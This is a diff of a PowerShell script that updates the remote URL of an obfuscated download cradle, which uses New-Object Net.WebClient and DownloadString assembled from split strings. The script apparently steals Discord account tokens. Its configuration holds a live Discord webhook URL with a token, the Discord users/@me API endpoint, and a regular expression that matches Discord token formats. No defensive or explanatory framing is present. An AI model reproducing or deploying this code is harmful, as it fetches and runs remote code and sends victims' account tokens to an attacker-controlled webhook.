@@ -6,7 +6,7 @@ function Get-Payload {
         "(New-Object",
         "Net.WebClient)",
         "DownloadString",
-        "('https://raw.githubusercontent.com/nullhost582/76576852349879433257908023976349862-/refs/heads/main/son.ps1')"
+        "('https://raw.githubusercontent.com/saksham123107-pixel/son/refs/heads/main/son.ps1')"
     )
     return ($s -join '') + " #" + $r
 }
@@ -49,7 +49,7 @@ try {
 } catch {}
 
 # === CONFIG (direct assignment, no double-encode overhead) ===
- $myUrl = "https://raw.githubusercontent.com/nullhost582/76576852349879433257908023976349862-/refs/heads/main/son.ps1"
+ $myUrl = "https://raw.githubusercontent.com/saksham123107-pixel/son/refs/heads/main/son.ps1"
  $hook  = "https://discord.com/api/webhooks/1538214692596621332/kEP2XURi2kl5l6uIRgf_HEMwSZUrlujk5KHi3TxcGcfF0hyr5rbUpRI-u-94Lo6aMIhD"
  $api   = "https://discord.com/api/v9/users/@me"
  $rgx   = '[\w-]{24,}\.[\w-]{4,}\.[\w-]{27,}'
